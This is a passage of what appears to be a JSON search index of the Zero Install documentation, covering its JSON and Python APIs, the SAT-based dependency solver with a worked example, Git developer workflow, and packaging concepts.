this comes the JSON message, giving the API version it will use. This will be the version you specified or the latest version it supports, whichever is smaller. To invoke an operation, send the message [\"invoke\", myref, op, args] , where myref is any string you choose, which will be attached to the reply, op is the operation to invoke and args are the arguments. Each message must start with a line giving the length in octets of the following message. For example, to ask 0install to select a set of components to run GnuPG: 0x5d [\"invoke\", \"1\", \"select\", [{\"interface\": \"http://repo.roscidus.com/security/gnupg\"}, false]] All responses have the form [\"return\", myref, status, return-value] , where myref lets you correlate this reply with the request you sent. The possible responses are [\"ok\", return-value] , [\"ok+xml\", return-value] and [\"fail\", error-message] . In the case of ok+xml , the message is immediately followed by another length line and some XML. The above request might generate this response, which says to use the distribution's native version of GnuPG (2.0.22-2): 0x0000002f [\"return\",\"1\",\"ok+xml\",[\"ok\",{\"stale\":false}]] 0x000001f5 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <selections interface=\"http://repo.roscidus.com/security/gnupg\" xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"><selection distributions=\"Arch Slack Debian RPM Gentoo Cygwin\" from-feed=\"distribution:http://repo.roscidus.com/security/gnupg\" id=\"package:arch:gnupg:2.0.22-2:x86_64\" interface=\"http://repo.roscidus.com/security/gnupg\" package=\"gnupg\" quick-test-file=\"/var/lib/pacman/local/gnupg-2.0.22-2/desc\" version=\"2.0.22-2\"/></selections>","title":"Introduction"},{"location":"developers/json-api/#callbacks","text":"In the process of handling your request, 0install may send its own invoke messages to you. You should be prepared to handle these messages: set-api-version(version) This is sent immediately at the start, indicating the protocol version to be used. The \"myref\" field is \"null\", indicating that no reply is expected. The version may be earlier than the version you requested, in which case you can either fall back to the earlier version or tell the user to upgrade. confirm(message) If 0install needs to ask the user to confirm something, it sends this message. This is used to confirm installation of distribution-provided packages, if any. Respond with success (\"ok\") and a return value of \"ok\" or \"cancel\". This is currently not used, because \"select\" does not require it. confirm-keys(feed_url, keys) A feed has been downloaded but has no trusted signature. Prompt the user to accept the keys. keys is a list of (fingerprint, hints) pairs, where hints is a list of (vote, message) hints from the key information server. Each vote is \"good\" or \"bad\". You should respond with a list of fingerprints which 0install should trust to sign updates for this domain. 0install will only ask you to confirm one feed at a time. Example: [\"invoke\",\"1\",\"confirm-keys\",[ \"http://repo.roscidus.com/lib/readline6\",{ \"DA9825AECAD089757CDABD8E07133F96CA74D8BA\":[ [\"good\",\"Thomas Leonard created Zero Install and ROX. This key is used to sign updates to the injector; you should accept it. It was announced on the Zero Install mailing list on 2009-05-31.\"]] }]] If the server is slow to respond, you will get a \"pending\" message instead, followed by a call to \"update-key-info\" later: [\"invoke\",\"1\",\"confirm-keys\",[ \"http://repo.roscidus.com/lib/readline6\",{ \"DA9825AECAD089757CDABD8E07133F96CA74D8BA\":[\"pending\"]}]] update-key-info If the key information server is slow to respond, 0install may call confirm-keys before the hints have arrived. It will then send this message when the information arrives (or fails), so you can update the display. Note: the format here is a list of keys rather than a map. Example: [\"invoke\",\"2\",\"update-key-info\", [\"DA9825AECAD089757CDABD8E07133F96CA74D8BA\",[ [\"bad\",\"Error fetching key info: ...\"]]]] If 0install is able to use its own GUI, it will use that rather than these callbacks. Start it with --console if you want to use your own GUI in all cases.","title":"Callbacks"},{"location":"developers/json-api/#operations","text":"Currently, only the select operation is supported (let us know if you want more; they're easy to add): select(requirements, refresh) Return a set of selections to run the given program. If refresh is true , 0install will always try to download a fresh copy of the feeds. Otherwise, it will reply immediately if possible. requirements is a JSON object with these keys (only interface is required): interface The URI of the program to run. command The <command> to run (e.g. run , test , compile or null ). source Whether to select source code (and build dependencies) rather than a binary. extra_restrictions An object mapping interface URIs to version expressions, e.g. {\"http://repo.roscidus.com/python/python\": \"..!3\"} to require a version of Python less than 3. os Select implementations for the given OS (e.g. \"Linux\") cpu Select implementations for the given CPU (e.g. \"x86_64\" or \"src\") message A message to display if 0install uses its own GUI (\"I need this because ...\") may_compile (0install >= 2.9; default false ) Treat source implementations as potential binaries. If a source implementation is selected, it will be tagged with requires-compilation=\"true\" to indicate this. Returns [\"ok\",{\"stale\":stale-flag}] on success. If stale-flag is true, the selections are based on old information. Consider using refresh to check for updates.","title":"Operations"},{"location":"developers/json-api/#sample-code","text":"There is some sample Python client code available.","title":"Sample code"},{"location":"developers/json-api/#backwards-compatibility","text":"The text above documents the latest version of the protocol. The differences are: 2.6 In this version, select returns \"ok\" without the information about staleness.","title":"Backwards compatibility"},{"location":"developers/python-api/","text":"The API is quite large and can be a little daunting at first. Here is a simple example, showing how to download a feed and import it into the cache (including downloading any missing GPG keys and confirming them with the user): from zeroinstall.injector.config import load_config from zeroinstall.support import tasks config = load_config() @tasks.async def download_info(feed_url): print \"Downloading\", feed_url feed_download = config.fetcher.download_and_import_feed(feed_url) yield feed_download tasks.check(feed_download) print \"Download complete\" feed = config.iface_cache.get_feed(feed_url) print \"Name:\", feed.name print \"Summary:\", feed.summary url = \"http://rox.sourceforge.net/2005/interfaces/ROX-Filer\" tasks.wait_for_blocker(download_info(url)) The first step is to create a Config object. load_config creates one from the configuration files in the user's home directory. 0install uses Python's generators to manage parallel processes (e.g. so that multiple downloads can happen in parallel without blocking each other). This is a kind of light-weight alternative to threads: control only passes between functions at the yield statements. To create a function that can operate like this, just annotate it with the @tasks.async decorator. In this case the download_info function uses a Fetcher to start downloading the feed. download_and_import_feed returns a Blocker for the result. Yielding this suspends the download_info function until the download is complete. When the blocker is done, we call tasks.check on it to check whether it was successful (tasks.check will throw an exception if not). If successful, we can get the updated feed from the IfaceCache . Other interesting starting points If you want to download all the feeds needed to run a program, use a Driver . To load and execute a saved set of selections, load them using a Selections object and pass them to run.execute_selections . To see how the 0install command is implemented, look in the zeroinstall.cmd package. Depending on 0install Just running the example above using e.g. python example.py would get the zeroinstall library from the system installation of 0install. It's better to create a local feed for your program and give 0install as a dependency. Then you can be sure your program will get a version of the libraries that it is compatible with (the system version may be too old). Here's a sample feed you can use: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>api-example</name> <summary>shows how to use the 0install Python API</summary> <group> <command name=\"run\" path=\"example.py\"> <runner interface=\"http://repo.roscidus.com/python/python\"> <version before=\"3\"/> </runner> </command> <requires interface=\"http://0install.net/2007/interfaces/ZeroInstall.xml\"> <version not-before=\"1.0\"/> <environment insert=\"\" name=\"PYTHONPATH\"/> </requires> <implementation id=\".\" version=\"0.1-pre\"/> </group> </interface>","title":"Python API"},{"location":"developers/python-api/#other-interesting-starting-points","text":"If you want to download all the feeds needed to run a program, use a Driver . To load and execute a saved set of selections, load them using a Selections object and pass them to run.execute_selections . To see how the 0install command is implemented, look in the zeroinstall.cmd package.","title":"Other interesting starting points"},{"location":"developers/python-api/#depending-on-0install","text":"Just running the example above using e.g. python example.py would get the zeroinstall library from the system installation of 0install. It's better to create a local feed for your program and give 0install as a dependency. Then you can be sure your program will get a version of the libraries that it is compatible with (the system version may be too old). Here's a sample feed you can use: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>api-example</name> <summary>shows how to use the 0install Python API</summary> <group> <command name=\"run\" path=\"example.py\"> <runner interface=\"http://repo.roscidus.com/python/python\"> <version before=\"3\"/> </runner> </command> <requires interface=\"http://0install.net/2007/interfaces/ZeroInstall.xml\"> <version not-before=\"1.0\"/> <environment insert=\"\" name=\"PYTHONPATH\"/> </requires> <implementation id=\".\" version=\"0.1-pre\"/> </group> </interface>","title":"Depending on 0install"},{"location":"developers/solver/","text":"When you run a program with 0install, 0install must select a version of the program and a compatible version of each dependency it requires, recursively. Choosing the best set of versions from the billions of potential combinations is the job of the Solver module. The 0install solver is an adaptation of the OPIUM algorithm (Optimal Package Install/Uninstall Manager). Background Adapting the OPIUM algorithm Worked example The OCaml implementation Background OPIUM was designed as a replacement solver for Debian's apt-get. With apt-get, if two programs depend on different versions of the same library, they can't both be installed at once. When you try to install one, apt-get will first uninstall the other. Sometimes this is unavoidable, but in other cases there is a choice of dependency. The choices apt-get makes determine which other packages must be uninstalled, but it doesn't always find the best solution (or even any solution at all). OPIUM solved this problem by ensuring that the best available choice was always made. 0install has a slightly different problem. In 0install, every package is unpacked to its own directory. Libraries are shared when possible (two programs depend on the same version), and installed in parallel otherwise. Therefore, installing one program with 0install never requires uninstalling another. However, it is still possible for the dependencies within a single program to conflict with each other. For example, a Python program may depend on \"python2.5 or python2.6\", but a library it uses may only work with one of them. When running that particular program, 0install must choose a version of Python and a version of the library that are compatible. While apt-get has to look for conflicts across a very large number of packages (every package installed or being considered for installation), 0install only has to consider the packages needed for the program being run, but it must look at a large number of different possible versions for each package. Before 2010, 0install used a simple non-backtracking solver, which was possible because most packages had only a few dependencies. Because exactly the same set of versions was available to everyone, if a program was installable by its author then it would be installable everywhere, and even if some dependencies did conflict it was easy enough to list them in some order so that 0install always got a solution. But a couple of things made life more complicated... Multi-arch support A typical modern 64-bit system is also capable of running 32-bit code. However a single program must be either entirely 64-bit or entirely 32-bit. We can't, for example, select a 64-bit version of libgtk and a 32-bit version of Python for a single application. In other words, every 64-bit binary conflicts with every 32-bit binary, which means we have to deal with a lot more conflicts these days. Native packages The Sugar developers wanted their 0install packages to depend on existing distribution packages in many cases. The normal way to do this is to provide a 0install download of the dependency (e.g Python 2.6) yourself, but tell 0install it can use a distribution package instead if available. However, the Sugar developers (quite reasonably) wanted to avoid packaging Python at all and depend only on the distribution package. Because Python isn't binary-compatible across versions, they publish separate builds of their software for each version of Python and relied on 0install to choose the one that will work with their users' distributions. These kinds of problems can't be solved using older versions of 0install. The solver would choose the Python 2.6 version of the main program (for example) and then try to select a version of Python 2.6 to go with it. If the distribution only had Python 2.5, this would fail. Aleksey Lim from the Sugar project worked around this problem by adding backtracking to the solver . However, this becomes very slow when there are many possible combinations of versions to consider. Adapting the OPIUM algorithm Initially, I tried following the OPIUM paper closely. There, they represent each possible version of each package as a variable which is 1 if the package is to be installed and 0 if not. They make a list of constraints (expressions that must be true). For example, if we want to select a version of Firefox (either 3.5 or 3.6, but not both at once) we would write: firefox3.5 + firefox3.6 = 1 If Firefox 3.6 depends on GTK >= 2.18 then we can express that dependency as: gtk2.18.0 + gtk2.18.1 + gtk2.18.2 - firefox3.6 >= 0 This expression can be satisfied by either not choosing Firefox 3.6 (firefox3.6 = 0) or by choosing a compatible version of GTK to go with it. After writing out all these expressions, we pass them all to a pseudo-boolean constraint solver (I tested with minisat+ ). We also give it a cost function to minimise (e.g. selecting older versions \"costs\" more, so it chooses newer versions where possible). The solver then tells us which variables should be 1, and these are the versions to use. This scheme worked, but it turned out to be quite slow. The problem was the cost function: most combinations have a similar cost, which makes it difficult for the solver to narrow the search down quickly. There could even be several solutions with the same cost, so you might get a different set of versions every time you ran it! The solution was to optimise one component at a time: Solve, optimising for the \"best\" version of Firefox that could be part of a valid selection . Then solve again, for the \"best\" version of GTK that can be part of a valid combination with the previously selected version of Firefox. ... and so on recursively until we have selected a version of every component we need. In fact, we don't need to use a cost function at all. We can just ask whether there is any valid combination involving the best version of Firefox. If not, we ask again for the second best version, etc. The problem can then be simplified to plain old Boolean satisfiability and implemented efficiently. A DPLL-based algorithm with conflict-driven learning turned out to be very fast, even implemented in pure Python . Worked example Consider the following case (we're trying to run \"prog\", of which there are two versions available): prog-1 requires lib-1 or lib-2 prog-2 requires lib-2 lib-1 requires python-2 lib-2 requires python-3 python-3 isn't available We first encode these rules into a set of binary expressions to be satisfied: Requirement Boolean expression prog-1 requires lib-1 or lib-2 lib-1 or lib-2 or !prog-1 prog-2 requires lib-2 lib-2 or !prog-2 lib-1 requires python-2 python-2 or !lib-1 lib-2 requires python-3 python-3 or !lib-2 python-3 isn't available !python-3 In addition, there are some constraints we always have: we must select a version of the program, and we can't select two different versions of any interface: Requirement Boolean expression must select some prog prog-1 or prog-2 only one prog at_most_one(prog-1, prog-2) only one lib at_most_one(lib-1, lib-2) only one python at_most_one(python-2, python-3) Note: we could express at_most_one(a, b) as \"!a or !b\", but that scales badly when there are lots of versions, so our SAT solver adds at_most_one as a primitive. Now the solve proceeds as follows: Find \"unit\" clauses. Here we find \"!python3\". Simplify all rules containing python3 to get: lib-1 or lib-2 or !prog-1 lib-2 or !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) at_most_one(lib-1, lib-2) We now have a new unit clause: \"!lib-2\". Simplify again: lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) Now we have \"!prog-2\": lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 Now we have \"prog-1\", which gets us \"lib-1\", which leaves us with the solution: lib-1 !prog-2 python-2 !lib-2 !python-3 prog-1 0install will then run prog-1 with lib-1 and python-2. In the above case, we were able to solve the problem simply by simplifying. Sometimes, we reach a point where there are no unit-clauses left. In that case, we set one undecided variable to try the most optimal remaining combination. If that leads to a solution, we have the optimal solution. If it leads to a conflict, we use \"conflict driven learning\" to learn a general rule which would avoid us trying that path, backtrack, and resume. The learning system helps to avoid exploring similar wrong-paths as the solve continues. The key to making this work is picking the most optimal next variable. Each time we need to choose, we do a depth first search of the current dependency tree: if we haven't yet picked a version of prog then we try setting the best remaining one to true (e.g. \"prog-2 = true\"). If we've already picked a version of prog, we look at its first dependency (always lib in this case) and try the best version of that, and so on. The OCaml implementation The blog post Simplifying the Solver With Functors contains more information about the new OCaml implementation of the solver.","title":"The Solver"},{"location":"developers/solver/#background","text":"OPIUM was designed as a replacement solver for Debian's apt-get. With apt-get, if two programs depend on different versions of the same library, they can't both be installed at once. When you try to install one, apt-get will first uninstall the other. Sometimes this is unavoidable, but in other cases there is a choice of dependency. The choices apt-get makes determine which other packages must be uninstalled, but it doesn't always find the best solution (or even any solution at all). OPIUM solved this problem by ensuring that the best available choice was always made. 0install has a slightly different problem. In 0install, every package is unpacked to its own directory. Libraries are shared when possible (two programs depend on the same version), and installed in parallel otherwise. Therefore, installing one program with 0install never requires uninstalling another. However, it is still possible for the dependencies within a single program to conflict with each other. For example, a Python program may depend on \"python2.5 or python2.6\", but a library it uses may only work with one of them. When running that particular program, 0install must choose a version of Python and a version of the library that are compatible. While apt-get has to look for conflicts across a very large number of packages (every package installed or being considered for installation), 0install only has to consider the packages needed for the program being run, but it must look at a large number of different possible versions for each package. Before 2010, 0install used a simple non-backtracking solver, which was possible because most packages had only a few dependencies. Because exactly the same set of versions was available to everyone, if a program was installable by its author then it would be installable everywhere, and even if some dependencies did conflict it was easy enough to list them in some order so that 0install always got a solution. But a couple of things made life more complicated... Multi-arch support A typical modern 64-bit system is also capable of running 32-bit code. However a single program must be either entirely 64-bit or entirely 32-bit. We can't, for example, select a 64-bit version of libgtk and a 32-bit version of Python for a single application. In other words, every 64-bit binary conflicts with every 32-bit binary, which means we have to deal with a lot more conflicts these days. Native packages The Sugar developers wanted their 0install packages to depend on existing distribution packages in many cases. The normal way to do this is to provide a 0install download of the dependency (e.g Python 2.6) yourself, but tell 0install it can use a distribution package instead if available. However, the Sugar developers (quite reasonably) wanted to avoid packaging Python at all and depend only on the distribution package. Because Python isn't binary-compatible across versions, they publish separate builds of their software for each version of Python and relied on 0install to choose the one that will work with their users' distributions. These kinds of problems can't be solved using older versions of 0install. The solver would choose the Python 2.6 version of the main program (for example) and then try to select a version of Python 2.6 to go with it. If the distribution only had Python 2.5, this would fail. Aleksey Lim from the Sugar project worked around this problem by adding backtracking to the solver . However, this becomes very slow when there are many possible combinations of versions to consider.","title":"Background"},{"location":"developers/solver/#adapting-the-opium-algorithm","text":"Initially, I tried following the OPIUM paper closely. There, they represent each possible version of each package as a variable which is 1 if the package is to be installed and 0 if not. They make a list of constraints (expressions that must be true). For example, if we want to select a version of Firefox (either 3.5 or 3.6, but not both at once) we would write: firefox3.5 + firefox3.6 = 1 If Firefox 3.6 depends on GTK >= 2.18 then we can express that dependency as: gtk2.18.0 + gtk2.18.1 + gtk2.18.2 - firefox3.6 >= 0 This expression can be satisfied by either not choosing Firefox 3.6 (firefox3.6 = 0) or by choosing a compatible version of GTK to go with it. After writing out all these expressions, we pass them all to a pseudo-boolean constraint solver (I tested with minisat+ ). We also give it a cost function to minimise (e.g. selecting older versions \"costs\" more, so it chooses newer versions where possible). The solver then tells us which variables should be 1, and these are the versions to use. This scheme worked, but it turned out to be quite slow. The problem was the cost function: most combinations have a similar cost, which makes it difficult for the solver to narrow the search down quickly. There could even be several solutions with the same cost, so you might get a different set of versions every time you ran it! The solution was to optimise one component at a time: Solve, optimising for the \"best\" version of Firefox that could be part of a valid selection . Then solve again, for the \"best\" version of GTK that can be part of a valid combination with the previously selected version of Firefox. ... and so on recursively until we have selected a version of every component we need. In fact, we don't need to use a cost function at all. We can just ask whether there is any valid combination involving the best version of Firefox. If not, we ask again for the second best version, etc. The problem can then be simplified to plain old Boolean satisfiability and implemented efficiently. A DPLL-based algorithm with conflict-driven learning turned out to be very fast, even implemented in pure Python .","title":"Adapting the OPIUM algorithm"},{"location":"developers/solver/#worked-example","text":"Consider the following case (we're trying to run \"prog\", of which there are two versions available): prog-1 requires lib-1 or lib-2 prog-2 requires lib-2 lib-1 requires python-2 lib-2 requires python-3 python-3 isn't available We first encode these rules into a set of binary expressions to be satisfied: Requirement Boolean expression prog-1 requires lib-1 or lib-2 lib-1 or lib-2 or !prog-1 prog-2 requires lib-2 lib-2 or !prog-2 lib-1 requires python-2 python-2 or !lib-1 lib-2 requires python-3 python-3 or !lib-2 python-3 isn't available !python-3 In addition, there are some constraints we always have: we must select a version of the program, and we can't select two different versions of any interface: Requirement Boolean expression must select some prog prog-1 or prog-2 only one prog at_most_one(prog-1, prog-2) only one lib at_most_one(lib-1, lib-2) only one python at_most_one(python-2, python-3) Note: we could express at_most_one(a, b) as \"!a or !b\", but that scales badly when there are lots of versions, so our SAT solver adds at_most_one as a primitive. Now the solve proceeds as follows: Find \"unit\" clauses. Here we find \"!python3\". Simplify all rules containing python3 to get: lib-1 or lib-2 or !prog-1 lib-2 or !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) at_most_one(lib-1, lib-2) We now have a new unit clause: \"!lib-2\". Simplify again: lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 or prog-2 at_most_one(prog-1, prog-2) Now we have \"!prog-2\": lib-1 or !prog-1 !prog-2 python-2 or !lib-1 !lib-2 !python-3 prog-1 Now we have \"prog-1\", which gets us \"lib-1\", which leaves us with the solution: lib-1 !prog-2 python-2 !lib-2 !python-3 prog-1 0install will then run prog-1 with lib-1 and python-2. In the above case, we were able to solve the problem simply by simplifying. Sometimes, we reach a point where there are no unit-clauses left. In that case, we set one undecided variable to try the most optimal remaining combination. If that leads to a solution, we have the optimal solution. If it leads to a conflict, we use \"conflict driven learning\" to learn a general rule which would avoid us trying that path, backtrack, and resume. The learning system helps to avoid exploring similar wrong-paths as the solve continues. The key to making this work is picking the most optimal next variable. Each time we need to choose, we do a depth first search of the current dependency tree: if we haven't yet picked a version of prog then we try setting the best remaining one to true (e.g. \"prog-2 = true\"). If we've already picked a version of prog, we look at its first dependency (always lib in this case) and try the best version of that, and so on.","title":"Worked example"},{"location":"developers/solver/#the-ocaml-implementation","text":"The blog post Simplifying the Solver With Functors contains more information about the new OCaml implementation of the solver.","title":"The OCaml implementation"},{"location":"developers/using-git/","text":"Testing developer versions using Git Fetching updates Understanding the OCaml code Making patches Making a new translation Testing developer versions using Git If you want to work on the code, or test a fix that has just been made, you'll want to get the latest developer version. We use Git for version control, so make sure you have that. You'll also need ' gettext-tools ' to build the translations. To install these on Ubuntu, open a terminal emulator and run this command: $ sudo apt-get install git gitk gettext (gitk is a largish visualisation tool and is not strictly necessary, but highly recommended) Click on the SCM link on any program's page to see its Git page (for example, 0install.git for 0install itself). The link for cloning is displayed there; use it like this: $ git clone https://github.com/0install/0install.git $ cd 0install The directory contains the latest version, plus a single (hidden) .git directory with all the git-related bits. To see the log: $ git log This doesn't require network access; your clone has the whole history. To view a visualisation of the history: $ gitk --all ( --all shows the history of all branches and tags, not just the main trunk) Fetching updates To download the latest updates into your copy: $ git pull --rebase (The --rebase option says that if you've committed some changes locally, they should be reapplied on top of the latest version. Otherwise, it would create a merge commit, which is usually not what you want.) You can also pull from other places. If someone posts to the mailing list, they will tell you where to pull from to try the feature out. If they send a patch, you can apply it with: $ git am the.patch Understanding the OCaml code Most modules have two files - a .ml file containing the implementation and a .mli file describing the module's public interface. You should always start by reading the .mli file. sigs.mli describes several abstract interfaces used in the code. Thomas Leonard's blog has many blog posts describing various aspects of 0install. For example, Simplifying the Solver With Functors explains how 0install chooses a compatible set of libraries to run a program, while Asynchronous Python vs OCaml describes the code for downloading things. Making patches If you've changed the code in some way then you can commit the changes like this (this just stores them on your own computer, in the .git sub-directory). $ git commit -a Enter a log message. The first line should be a short summary (like the subject of an email). Then leave a blank line, then write a longer description. To view your patch after committing: $ git show If you realised you made a mistake, correct it and then do: $ git commit -a --amend Finally, to make a patch file ready to send to the mailing list : $ git format-patch origin/master Making a new translation Note: translations are not currently working - see Gettext support in OCaml . Note: if you prefer, you can also use the Transifex web interface to work on translations. The steps are: Create the .pot ( .po template) file. Create a new directory share/locale/_$locale_/LC_MESSAGES inside the Git checkout. Copy the .pot file inside it with a .po extension. e.g. to make a French translation: $ make share/locale/zero-install.pot $ mkdir -p share/locale/fr/LC_MESSAGES $ cp share/locale/zero-install.pot share/locale/fr/LC_MESSAGES/zero-install.po Then edit the .po file to give a translation for each string. When you're done, create the .mo file from the .po file and test: $ make translations $ ./0launch Finally, send us the new .po file.","title":"Using Git"},{"location":"developers/using-git/#testing-developer-versions-using-git","text":"If you want to work on the code, or test a fix that has just been made, you'll want to get the latest developer version. We use Git for version control, so make sure you have that. You'll also need ' gettext-tools ' to build the translations. To install these on Ubuntu, open a terminal emulator and run this command: $ sudo apt-get install git gitk gettext (gitk is a largish visualisation tool and is not strictly necessary, but highly recommended) Click on the SCM link on any program's page to see its Git page (for example, 0install.git for 0install itself). The link for cloning is displayed there; use it like this: $ git clone https://github.com/0install/0install.git $ cd 0install The directory contains the latest version, plus a single (hidden) .git directory with all the git-related bits. To see the log: $ git log This doesn't require network access; your clone has the whole history. To view a visualisation of the history: $ gitk --all ( --all shows the history of all branches and tags, not just the main trunk)","title":"Testing developer versions using Git"},{"location":"developers/using-git/#fetching-updates","text":"To download the latest updates into your copy: $ git pull --rebase (The --rebase option says that if you've committed some changes locally, they should be reapplied on top of the latest version. Otherwise, it would create a merge commit, which is usually not what you want.) You can also pull from other places. If someone posts to the mailing list, they will tell you where to pull from to try the feature out. If they send a patch, you can apply it with: $ git am the.patch","title":"Fetching updates"},{"location":"developers/using-git/#understanding-the-ocaml-code","text":"Most modules have two files - a .ml file containing the implementation and a .mli file describing the module's public interface. You should always start by reading the .mli file. sigs.mli describes several abstract interfaces used in the code. Thomas Leonard's blog has many blog posts describing various aspects of 0install. For example, Simplifying the Solver With Functors explains how 0install chooses a compatible set of libraries to run a program, while Asynchronous Python vs OCaml describes the code for downloading things.","title":"Understanding the OCaml code"},{"location":"developers/using-git/#making-patches","text":"If you've changed the code in some way then you can commit the changes like this (this just stores them on your own computer, in the .git sub-directory). $ git commit -a Enter a log message. The first line should be a short summary (like the subject of an email). Then leave a blank line, then write a longer description. To view your patch after committing: $ git show If you realised you made a mistake, correct it and then do: $ git commit -a --amend Finally, to make a patch file ready to send to the mailing list : $ git format-patch origin/master","title":"Making patches"},{"location":"developers/using-git/#making-a-new-translation","text":"Note: translations are not currently working - see Gettext support in OCaml . Note: if you prefer, you can also use the Transifex web interface to work on translations. The steps are: Create the .pot ( .po template) file. Create a new directory share/locale/_$locale_/LC_MESSAGES inside the Git checkout. Copy the .pot file inside it with a .po extension. e.g. to make a French translation: $ make share/locale/zero-install.pot $ mkdir -p share/locale/fr/LC_MESSAGES $ cp share/locale/zero-install.pot share/locale/fr/LC_MESSAGES/zero-install.po Then edit the .po file to give a translation for each string. When you're done, create the .mo file from the .po file and test: $ make translations $ ./0launch Finally, send us the new .po file.","title":"Making a new translation"},{"location":"packaging/","text":"To make software available through 0install, you need to publish a signed \"feed\" XML file on your web page. This file lists the available versions and their dependencies and says how to run the program. There are lots of ways to create this XML file. To see an example of the XML, go to any 0install program's feed in your browser (e.g. 0export ) and View Page Source . Before you start, have a look at Concepts to make sure you understand some key terms and ideas. I want to... Publish an XML file for an existing binary release Read the binary packaging guide . This tutorial shows how to create an XML file describing the Blender 3D-animation application. The binary archive is published by the upstream authors and requires no modifications. Publish XML for a source release Start by reading the binary packaging guide . Most of the steps are the same. Read the 0compile user guide to understand how users compile 0install software. Read the 0compile developer guide for a tutorial showing how to publish the GNU Hello example package. Create an XML file describing my own software Read the 0release documentation, which shows how to add a local feed to your source repository. Users can use this to run your program from a Git checkout, and you can use it to generate new releases automatically. Have a look at the template projects for examples in various programming languages (Python, Java, .NET, C). Other useful documentation Feed specification The specification of the XML format. Templates Sample code packages which you can use as templates when creating a new program that will be distributed using 0install, or as examples for your own programs. Tools An index of the tools provided by the 0install project for generating feeds. Articles Binary distribution with 0install Blog article describing how to make packages using the 0template command-line tool. Compiling with SCons and GTK Article showing how to use Zero Install in your build scripts to download the SCons build system and use it to compile your program. Easy GTK binary compatibility This blog article shows how to use Zero Install to compile your program against older versions of library headers than are the default on your system. Binaries created this way work on a wider range of systems (all systems with a GTK version newer than the headers). Also, since they download the required headers automatically, users don't need to have the headers already on their system in order to compile your program. The binaries produced this way do not depend on Zero Install, so you can use Zero Install as part of your build process even if you don't distribute the resulting binaries that way.","title":"Overview"},{"location":"packaging/#publish-an-xml-file-for-an-existing-binary-release","text":"Read the binary packaging guide . This tutorial shows how to create an XML file describing the Blender 3D-animation application. The binary archive is published by the upstream authors and requires no modifications.","title":"Publish an XML file for an existing binary release"},{"location":"packaging/#publish-xml-for-a-source-release","text":"Start by reading the binary packaging guide . Most of the steps are the same. Read the 0compile user guide to understand how users compile 0install software. Read the 0compile developer guide for a tutorial showing how to publish the GNU Hello example package.","title":"Publish XML for a source release"},{"location":"packaging/#create-an-xml-file-describing-my-own-software","text":"Read the 0release documentation, which shows how to add a local feed to your source repository. Users can use this to run your program from a Git checkout, and you can use it to generate new releases automatically. Have a look at the template projects for examples in various programming languages (Python, Java, .NET, C).","title":"Create an XML file describing my own software"},{"location":"packaging/#other-useful-documentation","text":"Feed specification The specification of the XML format. Templates Sample code packages which you can use as templates when creating a new program that will be distributed using 0install, or as examples for your own programs. Tools An index of the tools provided by the 0install project for generating feeds.","title":"Other useful documentation"},{"location":"packaging/#articles","text":"Binary distribution with 0install Blog article describing how to make packages using the 0template command-line tool. Compiling with SCons and GTK Article showing how to use Zero Install in your build scripts to download the SCons build system and use it to compile your program. Easy GTK binary compatibility This blog article shows how to use Zero Install to compile your program against older versions of library headers than are the default on your system. Binaries created this way work on a wider range of systems (all systems with a GTK version newer than the headers). Also, since they download the required headers automatically, users don't need to have the headers already on their system in order to compile your program. The binaries produced this way do not depend on Zero Install, so you can use Zero Install as part of your build process even if you don't distribute the resulting binaries that way.","title":"Articles"},{"location":"packaging/concepts/","text":"Interfaces Feed files Implementations Launching Interfaces An interface describes what something does (e.g. \"Edit - a simple text editor\"). In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib When a user asks to run a program, they give the interface URI: $ 0launch http://rox.sourceforge.net/2005/interfaces/Edit When a program depends on a library, it gives library's interface URI: <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> Feed files A feed file is a list of implementations (versions) of an interface. It is called a feed because new versions get added to it when they are released, just as news items are added to an RSS feed. Usually an interface has only one feed file, located at the interface's URI. Some examples of feeds are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib /home/tal/dev/edit/Edit.xml (a local feed) You can add additional local and remote feeds to an interface. A local feed is located locally on your machine, whereas a remote feed is located on the web (even if it is cached on your machine). Implementations An implementation is something that implements an interface. Edit-1.9.6 and Edit-1.9.7 are both implementations of http://rox.sourceforge.net/2005/interfaces/Edit . Each implementation of an interface is identified by a cryptographic digest, eg: sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889 sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0 For platform independent binaries (e.g. Python code) there will be one implementation for each version. For compiled code, there will be one implementation per architecture per version. Launching When you launch a program (like Edit) 0install looks up the feed files of the interface and chooses an implementation of the interface and the interfaces it depends on according to the policy settings (e.g. preferring \"stable\" or \"testing\" implementations). 0install then downloads the implementations if they are missing from the cache. Lastly, 0install uses environment variables (bindings) to tell the program where to find its dependencies; this process is known as Dependency Injection (or Inversion of Control ).","title":"Concepts"},{"location":"packaging/concepts/#interfaces","text":"An interface describes what something does (e.g. \"Edit - a simple text editor\"). In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib When a user asks to run a program, they give the interface URI: $ 0launch http://rox.sourceforge.net/2005/interfaces/Edit When a program depends on a library, it gives library's interface URI: <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\">","title":"Interfaces"},{"location":"packaging/concepts/#feed-files","text":"A feed file is a list of implementations (versions) of an interface. It is called a feed because new versions get added to it when they are released, just as news items are added to an RSS feed. Usually an interface has only one feed file, located at the interface's URI. Some examples of feeds are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib 